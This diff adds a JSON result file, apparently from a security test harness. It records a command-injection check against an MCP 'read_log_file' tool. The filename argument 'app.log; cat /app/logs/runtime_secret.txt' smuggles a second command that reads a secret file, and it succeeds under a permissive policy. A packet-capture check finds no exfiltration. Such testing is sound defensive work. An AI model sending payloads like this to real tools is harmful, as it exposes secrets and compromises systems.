@@ -1,0 +1,59 @@
+{
+  "status": "vulnerable",
+  "mcp_mode": "command_injection_realistic",
+  "passed_file_value": "TEST_TOKEN_a56a3a92516e3eacca1166bbdc73ef3472342640cat: /app/logs/app.log: No such file or directory\n",
+  "evidence": {
+    "triggered": true,
+    "vulnerability": "command_injection_realistic_read_log_file",
+    "proof": "TEST_TOKEN_a56a3a92516e3eacca1166bbdc73ef3472342640cat: /app/logs/app.log: No such file or directory\n",
+    "tool_result": {
+      "mode": "mcp_client",
+      "tool": "read_log_file",
+      "result": "TEST_TOKEN_a56a3a92516e3eacca1166bbdc73ef3472342640cat: /app/logs/app.log: No such file or directory\n",
+      "audit_id": "718f78ebe87ce495",
+      "policy_applied": "allow",
+      "profile_used": "permissive",
+      "arguments": {
+        "filename": "app.log; cat /app/logs/runtime_secret.txt"
+      },
+      "request_body": {
+        "name": "read_log_file",
+        "arguments": {
+          "filename": "app.log; cat /app/logs/runtime_secret.txt"
+        }
+      },
+      "status_code": 200
+    },
+    "exfiltration": {
+      "network_capture": {
+        "checked": true,
+        "found": false,
+        "pcap_exists": true,
+        "requests_found": 0,
+        "matched_requests": [],
+        "pcap_files_checked": [
+          "/app/captures/evil-server.pcap",
+          "/app/captures/llm-harness.pcap",
+          "/app/captures/mcp-client.pcap",
+          "/app/captures/mcp-server.pcap",
+          "/app/captures/oauth-mock.pcap",
+          "/app/captures/real-target-demo.pcap",
+          "/app/captures/vuln-server-insecure.pcap",
+          "/app/captures/vuln-server-no-tls.pcap",
+          "/app/captures/vuln-server-ssrf-proxy.pcap",
+          "/app/captures/evil-server.pcap",
+          "/app/captures/llm-harness.pcap",
+          "/app/captures/mcp-client.pcap",
+          "/app/captures/mcp-server.pcap",
+          "/app/captures/oauth-mock.pcap",
+          "/app/captures/real-target-demo.pcap",
+          "/app/captures/vuln-server-insecure.pcap",
+          "/app/captures/vuln-server-no-tls.pcap",
+          "/app/captures/vuln-server-ssrf-proxy.pcap"
+        ],
+        "errors": [],
+        "retries_used": 1
+      }
+    }
+  }
+}
